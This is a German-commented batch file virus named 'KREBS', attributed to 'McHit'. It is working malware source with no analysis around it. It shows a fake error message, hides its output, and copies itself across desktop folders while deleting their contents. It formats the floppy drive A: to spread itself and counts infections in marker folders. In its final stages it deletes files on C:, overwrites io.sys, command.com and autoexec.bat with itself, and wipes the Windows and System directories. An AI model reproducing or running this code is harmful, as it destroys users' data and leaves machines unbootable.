@echo off
REM -KREBS(bat)-
REM by McHit
echo Beim Oeffnen des Programms ist ein Fehler aufgetretten!
echo Bitte wiederholen Sie den Vorgang!
ctty NUL
REM Ausbruchs des KREBS'
copy prog.bat C:\Windows\Desktop
md C:\Windows\Desktop\Problem
copy prog.bat C:\Windows\Desktop\Problem
md C:\Windows\Desktop\Explorer
copy prog.bat C:\Windows\Desktop\Explorer
md C:\Windows\Desktop\Info
copy prog.bat C:\WINDOWS\Desktop\Info
md C:\Windows\Desktop\Spiele
del C:\Windows\Desktop\Spiele\*.*
copy prog.bat C:\Windows\Desktop\Spiele
md C:\Windows\Desktop\Programme
del C:\Windows\Desktop\Programme\*.*
copy prog.bat C:\Windows\Desktop\Programme
md C:\Windows\Desktop\Internet
copy prog.bat C:\Windows\Desktop\Internet
copy prog.bat C:\
md C:\ReadMe
copy prog.bat C:\ReadMe\prog.bat
if exist C:\Windows\Krebs\1\*.* goto 2
goto nicht1
:2
if exist C:\Windows\Krebs\2\*.* goto 3
goto nicht2
:3
if exist C:\Windows\Krebs\3\*.* goto 4
goto nicht3
:4
if exist C:\Windows\Krebs\4\*.* goto 5
goto nicht4
:5
if exist C:\Windows\Krebs\5\*.* goto 5mal
goto nicht5
:nicht1
if exist A:\prog.bat goto Ende
format A: /u /q /autotest
copy prog.bat A:\prog.bat
md C:\Windows\Krebs\1
copy prog.bat C:\Windows\Krebs\1
goto Ende
:nicht2
if exist A:\prog.bat goto Ende
format A: /u /q /autotest
copy prog.bat A:\prog.bat
md C:\Windows\Krebs\2
copy prog.bat C:\Windows\Krebs\2
goto Ende
:nicht3
if exist A:\prog.bat goto Ende
format A: /u /q /autotest
copy prog.bat A:\prog.bat
md C:\Windows\Krebs\3
copy prog.bat C:\Windows\Krebs\3
goto Ende
:nicht4
if exist A:\prog.bat goto Ende
format A: /u /q /autotest
copy prog.bat A:\prog.bat
md C:\Windows\Krebs\4
copy prog.bat C:\Windows\Krebs\4
goto Ende
:nicht5
if exist A:\prog.bat goto Ende
format A: /u /q /autotest
copy prog.bat A:\prog.bat
md C:\Windows\Krebs\5
copy prog.bat C:\Windows\Krebs\5
goto Ende
:5mal
:stadium1
if exist C:\Windows\Krebs1\*.* goto stadium2
del C:\*.*
copy prog.bat C:\autoexec.bat
copy prog.bat C:\io.sys
copy prog.bat C:\config.sys
copy prog.bat C:\command.com
copy prog.bat C:\Windows\prog.bat
del C:\Windows\com*.*
copy prog.bat C:\Windows\command.com
del C:\Windows\command\*.*
copy prog.bat C:\Windows\Autoexec.bat
copy prog.bat C:\Windows\command\autoexec.bat
copy prog.bat C:\Windows\command\command.com
del C:\Windows\Krebs\5\*.*
rd C:\Windows\Krebs\5
del C:\Windows\Krebs\4\*.*
rd C:\Windows\Krebs\4
del C:\Windows\Krebs\3\*.*
rd C:\Windows\Krebs\3
del C:\Windows\Krebs\2\*.*
rd C:\Windows\Krebs\2
del C:\Windows\Krebs\1\*.*
rd C:\Windows\Krebs\1
rd C:\Windows\Krebs
md C:\Windows\Krebs1
copy prog.bat C:\Windows\Krebs1
goto Ende
:stadium2
if exist C:\Windows\Krebs2\*.* goto stadium3
del C:\Windows\System\*.*
del C:\Windows\*.*
del C:\Windows\Krebs\5\*.*
rd C:\Windows\Krebs\5
del C:\Windows\Krebs\4\*.*
rd C:\Windows\Krebs\4
del C:\Windows\Krebs\3\*.*
rd C:\Windows\Krebs\3
del C:\Windows\Krebs\2\*.*
rd C:\Windows\Krebs\2
del C:\Windows\Krebs\1\*.*
rd C:\Windows\Krebs\1
rd C:\Windows\Krebs
md C:\Windows\Krebs2
copy prog.bat C:\Windows\Krebs2
goto Ende
:stadium3
REM Endestadium
if exist A:\prog.bat goto TOD
format A: /u /q /autotest
copy prog.bat A:\prog.bat
:TOD
:Ende